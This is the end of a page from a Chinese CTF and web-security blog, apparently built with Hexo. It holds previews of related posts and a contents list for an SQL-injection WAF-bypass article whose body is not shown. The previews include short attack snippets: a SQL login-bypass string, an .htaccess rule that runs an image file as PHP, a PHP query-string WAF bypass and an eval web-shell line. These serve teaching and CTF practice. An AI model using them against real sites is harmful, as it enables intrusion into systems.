href="/tags/%E5%AE%89%E5%85%A8/">安全</a></div><div class="post-share"><div class="social-share" data-image="/images/Wallpaper/eatham.gif" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2020/02/29/%E7%BD%91%E9%BC%8E%E6%9D%AF2018/" title="网鼎杯2018"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" onerror="onerror=null;src='/images/404.png'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">网鼎杯2018</div></div><div class="info-2"><div class="info-item-1">Fakebook 预期解 join界面注册一个帐号看到有博客地址，猜测可能有SSRF，登录后账户下面有博客内容，不出意外就是SSRF了，简单的试了几个协议发现不行，然后扫描一下目录发现robots.txt 12User-agent: *Disallow: /user.php.bak 下载这个源码 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpclass UserInfo&#123;    public $name = &quot;&quot;;    public $age = 0;    public $blog = &quot;&quot;;    public function __construct($name, $age, $blog)    &#123;        $this-&gt;name = $name;        $this-&gt;age = (int)$age;        $this-&gt;blog = $blog;   ...</div></div></div></a><a class="pagination-related" href="/2020/02/28/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/" title="极客大挑战2019"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" onerror="onerror=null;src='/images/404.png'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">极客大挑战2019</div></div><div class="info-2"><div class="info-item-1">EasySQL 尝试了一下空格,or,'等发现没有过滤然后试了个万能密码 1' or '1…就出来了？？？。。。 可能是buuoj环境搭建错了吧。。  看了看别的大佬的博客  emmm，确实就这么个样。。过过过。。 Havefun  页面上什么都没有，页面源码有注释 12345$cat=$_GET[&#x27;cat&#x27;];echo $cat;if($cat==&#x27;dog&#x27;)&#123;	echo &#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;;&#125; 输入URL/?cat=dog然后。。。flag又出来了  Secret File 源码: 123456789101112131415 &lt;html&gt;    &lt;title&gt;secret&lt;/title&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php    highlight_file(__FILE__);    error_reporting(0);   ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2020/05/07/CTF%E4%B8%AD%E7%9A%84htaccess/" title="CTF中的htaccess"><img class="cover" src="/images/Wallpaper/eatham.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-07</div><div class="info-item-2">CTF中的htaccess</div></div><div class="info-2"><div class="info-item-1">服务器中间件为apache，因此想到了传.htaceess来解析php，通常我们用 .htaccess来解析非php后缀文件时用到 AddType application/x-httpd-php .ppp 或者 123&lt;FilesMatch &quot;shell.jpg&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; auto_append_file和auto_prepend_file 相关bypass 如果文件末尾被自动加上一句话,会导致服务器500错误,这时候可以在最后添加#\ 将换行转义成普通字符 如果特殊字符被实体编码, 可以通过特殊编码来绕过   相关比赛 XNUCA2019Qualifier </div></div></div></a><a class="pagination-related" href="/2020/03/19/PHP-RCE-Bypass/" title="PHP-RCE-Bypass"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-19</div><div class="info-item-2">PHP-RCE-Bypass</div></div><div class="info-2"><div class="info-item-1">无参数函数执行 https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/ 大致思路如下：  利用超全局变量进行bypass，进行RCE 进行任意文件读取  什么是无参数函数RCE 传统意义上，如果我们有 1eval($_GET[&#x27;code&#x27;]); 即代表我们拥有了一句话木马，可以进行getshell，例如  但是如果有如下限制 1if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;       ...</div></div></div></a><a class="pagination-related" href="/2020/02/27/PHP%E5%8F%82%E6%95%B0%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/" title="PHP参数字符串解析特性"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-27</div><div class="info-item-2">PHP参数字符串解析特性</div></div><div class="info-2"><div class="info-item-1">利用PHP的字符串解析特性Bypass ​     我们知道PHP将查询字符串（在URL或正文中）转换为内部GET或的关联数组_GET或的关联数组G​ET或的关联数组_POST。例如：/?foo=bar变成Array([foo]  =&gt;  “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过： 1/news.php?%20news[id%00=42&quot;+AND+1=0-- ​    上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。 ​    PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：  ​    1.删除空白符 ​    2.将某些字符转换为下划线（包括空格）  ​    例如：    User input Decoded...</div></div></div></a><a class="pagination-related" href="/2020/02/28/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E6%89%A9%E5%B1%95/" title="PHP反序列化及扩展"><img class="cover" src="/images/Wallpaper/eatham.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-28</div><div class="info-item-2">PHP反序列化及扩展</div></div><div class="info-2"><div class="info-item-1">phar扩展 </div></div></div></a><a class="pagination-related" href="/2020/03/12/Python-Opcode%E5%8F%8A%E5%88%A9%E7%94%A8Opcode%E7%BB%95%E8%BF%87python%E6%B2%99%E7%AE%B1/" title="Python-Opcode及利用Opcode绕过python沙箱"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-12</div><div class="info-item-2">Python-Opcode及利用Opcode绕过python沙箱</div></div><div class="info-2"><div class="info-item-1">0x01 OpCode opcode又称为操作码，是将python源代码进行编译之后的结果，python虚拟机无法直接执行human-readable的源代码，因此python编译器第一步先将源代码进行编译，以此得到opcode。例如在执行python程序时一般会先生成一个pyc文件，pyc文件就是编译后的结果，其中含有opcode序列。 如何查看一个函数的OpCode? 12345def a(): if 1 == 2:  print(&quot;flag&#123;****&#125;&quot;)print &quot;Opcode of a():&quot;,a.__code__.co_code.encode(&#x27;hex&#x27;) 通过此方法我们可以得到a函数的OpCode  co_code string of raw compiled bytecode  Opcode of a(): 6401006402006b020072140064030047486e000064000053 我们可以通过dis库获得相应的解析结果。 123import...</div></div></div></a><a class="pagination-related" href="/2020/03/12/Python%E4%BB%A3%E7%A0%81%E5%AF%B9%E8%B1%A1code-object%E4%B8%8E-code-%E5%B1%9E%E6%80%A7/" title="Python代码对象code-object与__code__属性"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-12</div><div class="info-item-2">Python代码对象code-object与__code__属性</div></div><div class="info-2"><div class="info-item-1">0x01概念 代码对象 code object 是一段可执行的 Python 代码在 CPython 中的内部表示。 可执行的 Python 代码包括：  函数 模块 类 生成器表达式  当你运行一段代码时，它被解析并编译成代码对象，随后被 CPython 虚拟机执行。 代码对象包含一系列直接操作虚拟机内部状态的指令。 这跟你在用 C 语言编程时是类似的，你写出人类可读的文本，然后用编译器转换成二进制形式，二进制代码（C 的机器码或者是 Python 的字节码）被 CPU（对于 C 语言来说）或者 CPython 虚拟机虚拟的 CPU 直接执行。 代码对象除了包含 指令，还提供了虚拟机运行代码所需要的一些 额外信息。 0x02探索 以下的内容是在 Python 3.7 中实验的，而且主要是针对于函数来讲。至于模块和类虽然也是通过代码对象实现的（实际上，.pyc 文件里面就存放着序列化的模块代码对象），但是代码对象的大多数特性主要和函数相关。 关于版本需要注意两点：  在 Python 2 中，函数的代码对象通过 函数.func_code 来访问；而 Python 3...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="lv-container" data-id="city" data-uid="MTAyMC80NzA1My8yMzU1Mw=="></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">LYC</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">251</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">49</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">sql语句中空格的代替方法:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">绕过union select过滤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">特殊字符绕过waf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">PDO下的bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82"><span class="toc-number">5.1.</span> <span class="toc-text">宽字节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0"><span class="toc-number">5.2.</span> <span class="toc-text">堆叠</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99"><span class="toc-number">5.3.</span> <span class="toc-text">报错</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/29/4GPU%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E7%BB%B4%E6%8A%A4/" title="4GPU服务器环境配置及维护"><img src="/images/Wallpaper/rainbowcat.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="4GPU服务器环境配置及维护"/></a><div class="content"><a class="title" href="/2023/08/29/4GPU%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E7%BB%B4%E6%8A%A4/" title="4GPU服务器环境配置及维护">4GPU服务器环境配置及维护</a><time datetime="2023-08-29T12:00:26.000Z" title="发表于 2023-08-29 20:00:26">2023-08-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/29/UEFI-systemd%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/" title="UEFI+systemd开机启动流程"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="UEFI+systemd开机启动流程"/></a><div class="content"><a class="title" href="/2023/08/29/UEFI-systemd%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/" title="UEFI+systemd开机启动流程">UEFI+systemd开机启动流程</a><time datetime="2023-08-29T08:39:54.000Z" title="发表于 2023-08-29 16:39:54">2023-08-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/27/udev%E9%85%8D%E7%BD%AELinux%E7%BD%91%E7%BB%9C%E6%8E%A5%E5%8F%A3/" title="udev配置Linux网络接口"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="udev配置Linux网络接口"/></a><div class="content"><a class="title" href="/2023/08/27/udev%E9%85%8D%E7%BD%AELinux%E7%BD%91%E7%BB%9C%E6%8E%A5%E5%8F%A3/" title="udev配置Linux网络接口">udev配置Linux网络接口</a><time datetime="2023-08-27T12:49:29.000Z" title="发表于 2023-08-27 20:49:29">2023-08-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/27/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E7%BB%9C%E8%BF%90%E7%BB%B4/" title="实验室服务器网络运维"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="实验室服务器网络运维"/></a><div class="content"><a class="title" href="/2023/08/27/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E7%BB%9C%E8%BF%90%E7%BB%B4/" title="实验室服务器网络运维">实验室服务器网络运维</a><time datetime="2023-08-27T12:20:23.000Z" title="发表于 2023-08-27 20:20:23">2023-08-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/21/Attention%E6%9C%BA%E5%88%B6-transformer/" title="Attention机制_transformer"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="Attention机制_transformer"/></a><div class="content"><a class="title" href="/2022/11/21/Attention%E6%9C%BA%E5%88%B6-transformer/" title="Attention机制_transformer">Attention机制_transformer</a><time datetime="2022-11-21T11:55:15.000Z" title="发表于 2022-11-21 19:55:15">2022-11-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By LYC</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(async () => {
+  const showKatex = () => {
+    document.querySelectorAll('#article-container .katex').forEach(el => el.classList.add('katex-show'))
+  }
+
+  if (!window.katex_js_css) {
+    window.katex_js_css = true
+    await btf.getCSS('https://cdn.jsdelivr.net/npm/katex/dist/katex.min.css')
+    if (true) {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/katex/dist/contrib/copy-tex.min.js')
+    }
+  }
+
+  showKatex()
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+
+  const loadLivere = (el, path) => {
+    window.livereOptions = {
+      refer: path || location.pathname
+    }
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyLivere = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    if (typeof LivereTower === 'object') window.LivereTower.init()
+    else {
+      (function(d, s) {
+          var j, e = d.getElementsByTagName(s)[0];
+          if (typeof LivereTower === 'function') { return; }
+          j = d.createElement(s);
+          j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+          j.async = true;
+          e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    }
+  }
+
+  if (isShuoshuo) {
+    'Livere' === 'Livere'
+      ? window.shuoshuoComment = { loadComment: loadLivere }
+      : window.loadOtherComment = loadLivere
+    return
+  }
+
+  if ('Livere' === 'Livere' || !false) {
+    if (false) btf.loadComment(document.getElementById('lv-container'), loadLivere)
+    else loadLivere()
+  } else {
+    window.loadOtherComment = loadLivere
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
